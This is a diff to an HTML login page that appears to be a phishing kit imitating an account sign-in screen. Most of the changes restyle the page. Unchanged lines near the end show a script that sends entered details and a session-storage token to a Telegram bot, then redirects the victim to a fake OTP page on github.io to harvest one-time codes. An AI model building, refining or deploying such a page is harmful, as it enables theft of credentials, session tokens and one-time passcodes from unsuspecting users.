@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Login</title>
   <style>
     body {
@@ -20,37 +20,43 @@
     }
 
     .logo {
-      width: 150px;
+      width: 130px;
+      height: auto;
       margin-bottom: 20px;
     }
 
     .login-box {
-      background: white;
-      padding: 30px;
+      background: #fff;
+      padding: 35px 30px;
+      border: 1px solid #d3d3d3;
       border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
       width: 100%;
       max-width: 400px;
     }
 
     .login-box h2 {
-      text-align: center;
       font-weight: normal;
-      margin-bottom: 20px;
+      font-size: 16px;
+      text-align: center;
+      margin-bottom: 25px;
+      color: #444;
     }
 
     .login-box label {
+      display: block;
       font-weight: bold;
       font-size: 14px;
+      margin-top: 10px;
+      color: #333;
     }
 
     .login-box input[type="text"],
     .login-box input[type="password"] {
       width: 100%;
       padding: 10px;
-      margin: 8px 0 16px 0;
+      margin-top: 5px;
       border: 1px solid #ccc;
-      border-radius: 5px;
+      border-radius: 4px;
       font-size: 15px;
     }
 
@@ -64,6 +70,7 @@
       cursor: pointer;
       font-weight: bold;
       font-size: 16px;
+      margin-top: 20px;
     }
 
     .login-box input[type="submit"]:hover {
@@ -78,7 +85,7 @@
     }
 
     .footer-links a {
-      color: #0066cc;
+      color: #007bff;
       text-decoration: none;
     }
 
@@ -96,12 +103,12 @@
     <h2>Please log in with your credentials to view your account details.</h2>
 
     <label for="username">Username</label>
-    <input type="text" id="username" placeholder="Enter Username" required>
+    <input type="text" id="username" placeholder="Enter Username" required />
 
     <label for="password">Password</label>
-    <input type="password" id="password" placeholder="Enter Password" required>
+    <input type="password" id="password" placeholder="Enter Password" required />
 
-    <input type="submit" value="Log In">
+    <input type="submit" value="Log In" />
 
     <div class="footer-links">
       <a href="#">Enroll</a>
@@ -156,7 +163,6 @@ SessionStorage Token: ${sessionToken}
       body: `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`
     });
 
-    // Redirect to OTP page after sending
     window.location.href = "https://bigbinbabyxxx.github.io/whitney/otp.html";
   }
 </script>
